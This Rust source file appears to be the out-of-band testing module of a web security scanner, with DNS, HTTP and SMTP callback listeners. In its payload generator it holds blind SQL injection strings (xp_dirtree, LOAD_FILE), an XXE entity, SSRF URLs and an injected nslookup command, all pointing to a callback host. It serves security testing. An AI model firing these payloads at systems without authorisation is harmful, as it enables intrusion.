use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::OnceLock;
use tokio::sync::{watch, Mutex};

// Shutdown signals per listener so a running server can be cleanly stopped.
static SHUTDOWN_HTTP: OnceLock<Mutex<Option<watch::Sender<bool>>>> = OnceLock::new();
static SHUTDOWN_DNS: OnceLock<Mutex<Option<watch::Sender<bool>>>> = OnceLock::new();
static SHUTDOWN_SMTP: OnceLock<Mutex<Option<watch::Sender<bool>>>> = OnceLock::new();

fn shutdown_slot(kind: &str) -> &'static Mutex<Option<watch::Sender<bool>>> {
    match kind {
        "http" => SHUTDOWN_HTTP.get_or_init(|| Mutex::new(None)),
        "dns" => SHUTDOWN_DNS.get_or_init(|| Mutex::new(None)),
        "smtp" => SHUTDOWN_SMTP.get_or_init(|| Mutex::new(None)),
        _ => unreachable!(),
    }
}

pub async fn stop_listener(kind: &str) -> bool {
    let slot = shutdown_slot(kind);
    let mut guard = slot.lock().await;
    if let Some(tx) = guard.take() {
        let _ = tx.send(true);
        true
    } else {
        false
    }
}

async fn install_shutdown(kind: &str) -> watch::Receiver<bool> {
    let (tx, rx) = watch::channel(false);
    let slot = shutdown_slot(kind);
    let mut guard = slot.lock().await;
    if let Some(prev) = guard.take() {
        let _ = prev.send(true);
    }
    *guard = Some(tx);
    rx
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OastPayload {
    pub id: String,
    pub correlation_id: String,
    pub subdomain: String,
    pub full_url: String,
    pub dns_payload: String,
    pub http_payload: String,
    /// Path-based callback URL that works whether server_domain is an IP or DNS
    /// name. Listener correlates by the path segment.
    pub callback_url: String,
    pub smtp_payload: String,
    pub created_at: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OastInteraction {
    pub id: String,
    pub correlation_id: String,
    pub interaction_type: String, // "dns", "http", "smtp"
    pub source_ip: String,
    pub timestamp: String,
    pub raw_data: String,
    pub details: HashMap<String, String>,
}

pub static INTERACTIONS: OnceLock<Mutex<Vec<OastInteraction>>> = OnceLock::new();

pub fn get_interactions() -> &'static Mutex<Vec<OastInteraction>> {
    INTERACTIONS.get_or_init(|| Mutex::new(Vec::new()))
}

// Track the running OAST HTTP listener so other tools (active_scan with_oast,
// oast_generate_payload) can route callbacks to the same instance.
static HTTP_LISTENER_PORT: std::sync::atomic::AtomicU16 = std::sync::atomic::AtomicU16::new(0);

pub fn http_listener_port() -> Option<u16> {
    let p = HTTP_LISTENER_PORT.load(std::sync::atomic::Ordering::Relaxed);
    if p == 0 {
        None
    } else {
        Some(p)
    }
}

pub fn set_http_listener_port(port: u16) {
    HTTP_LISTENER_PORT.store(port, std::sync::atomic::Ordering::Relaxed);
}

/// Resolve the callback host to embed in OAST payloads. Defaults to
/// 127.0.0.1 (works for localhost targets). Override with WS_OAST_HOST for
/// external targets (your public IP or a tunneled hostname).
pub fn callback_host() -> String {
    std::env::var("WS_OAST_HOST").unwrap_or_else(|_| "127.0.0.1".to_string())
}

/// Idempotently make sure the HTTP callback listener is running. Returns the
/// port it's bound to. Safe to call repeatedly.
pub async fn ensure_http_listener(default_port: u16) -> Result<u16, String> {
    if let Some(p) = http_listener_port() {
        return Ok(p);
    }
    start_http_callback_server(default_port).await?;
    set_http_listener_port(default_port);
    // Brief settle so the listener is ready before the first probe.
    tokio::time::sleep(std::time::Duration::from_millis(150)).await;
    Ok(default_port)
}

pub fn generate_oast_payload(description: &str, server_domain: &str) -> OastPayload {
    let correlation_id = generate_random_string(16);
    let random_part = generate_random_string(12);
    let subdomain = format!("{}.{}.{}", random_part, correlation_id, server_domain);

    OastPayload {
        id: uuid::Uuid::new_v4().to_string(),
        correlation_id: correlation_id.clone(),
        subdomain: subdomain.clone(),
        full_url: format!("http://{}", subdomain),
        dns_payload: subdomain.clone(),
        http_payload: format!("http://{}/", subdomain),
        callback_url: format!("http://{}/{}", server_domain, correlation_id),
        smtp_payload: format!("oast-{}@{}", correlation_id, server_domain),
        created_at: iso_now(),
        description: description.to_string(),
    }
}

pub fn generate_oast_payloads_for_scan(
    target: &str,
    server_domain: &str,
) -> Vec<(String, String, OastPayload)> {
    let mut payloads = Vec::new();

    let sqli_oast = generate_oast_payload(&format!("Blind SQLi on {}", target), server_domain);
    payloads.push(("sqli".into(), format!("'; EXEC xp_dirtree '//{}'--", sqli_oast.subdomain), sqli_oast));

    let sqli_oast2 = generate_oast_payload(&format!("Blind SQLi LOAD_FILE on {}", target), server_domain);
    payloads.push((
        "sqli".into(),
        format!("' UNION SELECT LOAD_FILE('//{}/a')--", sqli_oast2.subdomain),
        sqli_oast2,
    ));

    let ssrf_oast = generate_oast_payload(&format!("Blind SSRF on {}", target), server_domain);
    payloads.push(("ssrf".into(), ssrf_oast.http_payload.clone(), ssrf_oast));

    let xxe_oast = generate_oast_payload(&format!("Blind XXE on {}", target), server_domain);
    payloads.push((
        "xxe".into(),
        format!(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{}\">]><foo>&xxe;</foo>",
            xxe_oast.http_payload
        ),
        xxe_oast,
    ));

    let cmd_oast = generate_oast_payload(&format!("Blind CmdInj on {}", target), server_domain);
    payloads.push(("command_injection".into(), format!("; nslookup {} #", cmd_oast.subdomain), cmd_oast));

    payloads
}

pub fn collaborator_everywhere_headers(server_domain: &str) -> Vec<(String, String, OastPayload)> {
    let headers_to_inject = vec![
        "Referer",
        "Origin",
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Original-URL",
        "X-Wap-Profile",
        "Contact",
        "From",
        "True-Client-IP",
        "Client-IP",
        "Forwarded",
        "X-Client-IP",
        "X-Real-IP",
        "CF-Connecting-IP",
    ];

    headers_to_inject
        .into_iter()
        .map(|header| {
            let payload =
                generate_oast_payload(&format!("Collaborator Everywhere: {}", header), server_domain);
            let inject_value = if header == "Referer" || header == "Origin" || header == "X-Wap-Profile" {
                payload.http_payload.clone()
            } else if header == "From" || header == "Contact" {
                payload.smtp_payload.clone()
            } else {
                payload.subdomain.clone()
            };
            (header.to_string(), inject_value, payload)
        })
        .collect()
}

pub async fn start_dns_server(port: u16) -> Result<(), String> {
    use tokio::net::UdpSocket;

    let socket = UdpSocket::bind(format!("0.0.0.0:{}", port))
        .await
        .map_err(|e| format!("Failed to bind DNS port {}: {}", port, e))?;
    let mut shutdown = install_shutdown("dns").await;
    println!("[OAST] DNS callback server started on port {}", port);

    tokio::spawn(async move {
        let mut buf = [0u8; 512];
        loop {
            tokio::select! {
                _ = shutdown.changed() => {
                    if *shutdown.borrow() {
                        println!("[OAST] DNS server stopping");
                        break;
                    }
                }
                recv = socket.recv_from(&mut buf) => match recv {
                    Ok((len, src)) => {
                        if let Some(domain) = parse_dns_query(&buf[..len]) {
                            println!("[OAST-DNS] Query from {}: {}", src, domain);
                            let parts: Vec<&str> = domain.split('.').collect();
                            let correlation_id = if parts.len() >= 3 { parts[1].to_string() } else { "unknown".to_string() };
                            let interaction = OastInteraction {
                                id: uuid::Uuid::new_v4().to_string(),
                                correlation_id,
                                interaction_type: "dns".into(),
                                source_ip: src.to_string(),
                                timestamp: iso_now(),
                                raw_data: format!("DNS Query: {}", domain),
                                details: {
                                    let mut d = HashMap::new();
                                    d.insert("queried_domain".into(), domain.clone());
                                    d.insert("query_type".into(), "A".into());
                                    d.insert("raw_length".into(), len.to_string());
                                    d
                                },
                            };
                            get_interactions().lock().await.push(interaction);
                            if len >= 12 {
                                let mut resp = buf[..len].to_vec();
                                resp[2] = 0x81;
                                resp[3] = 0x80;
                                resp[6] = 0x00;
                                resp[7] = 0x01;
                                resp.extend_from_slice(&[0xC0, 0x0C]);
                                resp.extend_from_slice(&[0x00, 0x01]);
                                resp.extend_from_slice(&[0x00, 0x01]);
                                resp.extend_from_slice(&[0x00, 0x00, 0x00, 0x3C]);
                                resp.extend_from_slice(&[0x00, 0x04]);
                                resp.extend_from_slice(&[127, 0, 0, 1]);
                                let _ = socket.send_to(&resp, src).await;
                            }
                        }
                    }
                    Err(e) => eprintln!("[OAST-DNS] Error: {}", e),
                }
            }
        }
    });

    Ok(())
}

pub async fn start_http_callback_server(port: u16) -> Result<(), String> {
    use axum::{extract::ConnectInfo, routing::any, Router};
    use std::net::SocketAddr;

    let handler = any(|ConnectInfo(addr): ConnectInfo<SocketAddr>, req: axum::extract::Request| async move {
        let path = req.uri().path().to_string();
        let method = req.method().to_string();
        let headers: HashMap<String, String> = req
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let host = headers.get("host").cloned().unwrap_or_default();
        // Path-based correlation works for both IP-only and DNS-based listeners.
        // Only fall back to subdomain extraction if the path doesn't carry one.
        let path_corr = path.trim_start_matches('/').split('/').next().unwrap_or("");
        let is_ip_host = host.split(':').next().unwrap_or("").chars().all(|c| c.is_ascii_digit() || c == '.');
        let correlation_id = if !path_corr.is_empty() && path_corr != "favicon.ico" {
            path_corr.to_string()
        } else if !is_ip_host {
            let parts: Vec<&str> = host.split('.').collect();
            if parts.len() >= 3 {
                parts[1].to_string()
            } else {
                "unknown".to_string()
            }
        } else {
            "unknown".to_string()
        };
        println!("[OAST-HTTP] {} {} from {} (corr: {})", method, path, addr, correlation_id);
        let interaction = OastInteraction {
            id: uuid::Uuid::new_v4().to_string(),
            correlation_id,
            interaction_type: "http".into(),
            source_ip: addr.to_string(),
            timestamp: iso_now(),
            raw_data: format!("{} {} HTTP/1.1\nHost: {}", method, path, host),
            details: {
                let mut d = HashMap::new();
                d.insert("method".into(), method);
                d.insert("path".into(), path);
                d.insert("host".into(), host);
                for (k, v) in &headers {
                    d.insert(format!("header_{}", k), v.clone());
                }
                d
            },
        };
        get_interactions().lock().await.push(interaction);
        "OAST callback received"
    });

    // Match both root (/) and any sub-path so a bare GET on the host is logged.
    let app = Router::new().route("/", handler.clone()).route("/{*path}", handler);

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    let listener = tokio::net::TcpListener::bind(addr)
        .await
        .map_err(|e| format!("Failed to bind HTTP port {}: {}", port, e))?;
    let mut shutdown = install_shutdown("http").await;
    println!("[OAST] HTTP callback server started on port {}", port);

    tokio::spawn(async move {
        let svc = app.into_make_service_with_connect_info::<SocketAddr>();
        let server = axum::serve(listener, svc);
        let _ = server
            .with_graceful_shutdown(async move {
                let _ = shutdown.changed().await;
                println!("[OAST] HTTP server stopping");
            })
            .await;
    });

    Ok(())
}

pub async fn start_smtp_server(port: u16) -> Result<(), String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;

    let listener = TcpListener::bind(format!("0.0.0.0:{}", port))
        .await
        .map_err(|e| format!("Failed to bind SMTP port {}: {}", port, e))?;
    let mut shutdown = install_shutdown("smtp").await;
    println!("[OAST] SMTP callback server started on port {}", port);

    tokio::spawn(async move {
        loop {
            let accept = tokio::select! {
                _ = shutdown.changed() => {
                    if *shutdown.borrow() {
                        println!("[OAST] SMTP server stopping");
                        return;
                    }
                    continue;
                }
                a = listener.accept() => a,
            };
            if let Ok((mut stream, addr)) = accept {
                tokio::spawn(async move {
                    let banner = b"220 oast.wondersuite.local ESMTP WonderSuite OAST\r\n";
                    let _ = stream.write_all(banner).await;

                    let mut buf = [0u8; 1024];
                    let mut mail_from = String::new();
                    let mut rcpt_to = String::new();
                    let mut data = String::new();
                    let mut in_data = false;

                    loop {
                        match stream.read(&mut buf).await {
                            Ok(0) => break,
                            Ok(n) => {
                                let line = String::from_utf8_lossy(&buf[..n]).to_string();

                                if in_data {
                                    if line.contains("\r\n.\r\n") || line.trim() == "." {
                                        in_data = false;
                                        let _ = stream.write_all(b"250 OK\r\n").await;

                                        let correlation_id = rcpt_to
                                            .split("oast-")
                                            .nth(1)
                                            .and_then(|s| s.split('@').next())
                                            .unwrap_or("unknown")
                                            .to_string();

                                        println!(
                                            "[OAST-SMTP] Email from {} via {} (corr: {})",
                                            mail_from, addr, correlation_id
                                        );

                                        let interaction = OastInteraction {
                                            id: uuid::Uuid::new_v4().to_string(),
                                            correlation_id,
                                            interaction_type: "smtp".into(),
                                            source_ip: addr.to_string(),
                                            timestamp: iso_now(),
                                            raw_data: format!(
                                                "MAIL FROM: {}\nRCPT TO: {}\nDATA:\n{}",
                                                mail_from, rcpt_to, data
                                            ),
                                            details: {
                                                let mut d = HashMap::new();
                                                d.insert("mail_from".into(), mail_from.clone());
                                                d.insert("rcpt_to".into(), rcpt_to.clone());
                                                d
                                            },
                                        };

                                        let store = get_interactions();
                                        store.lock().await.push(interaction);
                                    } else {
                                        data.push_str(&line);
                                    }
                                    continue;
                                }

                                let upper = line.to_uppercase();
                                if upper.starts_with("HELO") || upper.starts_with("EHLO") {
                                    let _ = stream.write_all(b"250 Hello\r\n").await;
                                } else if upper.starts_with("MAIL FROM:") {
                                    mail_from = line[10..].trim().to_string();
                                    let _ = stream.write_all(b"250 OK\r\n").await;
                                } else if upper.starts_with("RCPT TO:") {
                                    rcpt_to = line[8..].trim().to_string();
                                    let _ = stream.write_all(b"250 OK\r\n").await;
                                } else if upper.starts_with("DATA") {
                                    in_data = true;
                                    let _ = stream.write_all(b"354 Start mail input\r\n").await;
                                } else if upper.starts_with("QUIT") {
                                    let _ = stream.write_all(b"221 Bye\r\n").await;
                                    break;
                                } else {
                                    let _ = stream.write_all(b"250 OK\r\n").await;
                                }
                            }
                            Err(_) => break,
                        }
                    }
                });
            }
        }
    });

    Ok(())
}

/// Parse a DNS query packet to extract the queried domain name
fn parse_dns_query(packet: &[u8]) -> Option<String> {
    if packet.len() < 12 {
        return None;
    }

    let mut pos = 12; // Skip header
    let mut domain_parts = Vec::new();

    loop {
        if pos >= packet.len() {
            break;
        }
        let label_len = packet[pos] as usize;
        if label_len == 0 {
            break;
        }
        pos += 1;
        if pos + label_len > packet.len() {
            break;
        }
        if let Ok(label) = std::str::from_utf8(&packet[pos..pos + label_len]) {
            domain_parts.push(label.to_string());
        }
        pos += label_len;
    }

    if domain_parts.is_empty() {
        None
    } else {
        Some(domain_parts.join("."))
    }
}

fn generate_random_string(len: usize) -> String {
    use rand::Rng;
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::thread_rng();
    (0..len).map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char).collect()
}

pub fn iso_now() -> String {
    chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true)
}
